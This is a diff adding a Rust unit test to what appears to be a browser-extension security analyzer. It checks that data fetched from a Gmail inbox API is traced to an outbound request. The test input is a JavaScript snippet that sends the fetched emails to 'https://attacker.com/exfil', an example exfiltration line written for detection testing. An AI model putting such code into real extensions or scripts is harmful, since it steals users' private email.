@@ -209,3 +209,24 @@ fn test_source_tracker_dom_element() {
         .unwrap();
     assert!(endpoint.data_sources.iter().any(|s| matches!(s, extanalyzer::models::DataSource::DomElement(selector) if selector == ".secret-data")));
 }
+
+#[test]
+fn test_source_tracker_network_response() {
+    let code = r#"
+        let response = await fetch('https://mail.google.com/api/inbox');
+        let emails = await response.json();
+        fetch('https://attacker.com/exfil', { body: JSON.stringify(emails) });
+    "#;
+
+    let (_, endpoints) = extanalyzer::analyze::javascript::analyze_javascript(
+        code,
+        std::path::Path::new("test.js"),
+    );
+
+    // Find the endpoint that has data sources (from the fetch call, not the string literal)
+    let endpoint = endpoints
+        .iter()
+        .find(|e| e.url.contains("attacker.com") && !e.data_sources.is_empty())
+        .unwrap();
+    assert!(endpoint.data_sources.iter().any(|s| matches!(s, extanalyzer::models::DataSource::NetworkResponse(url) if url.contains("mail.google.com"))));
+}
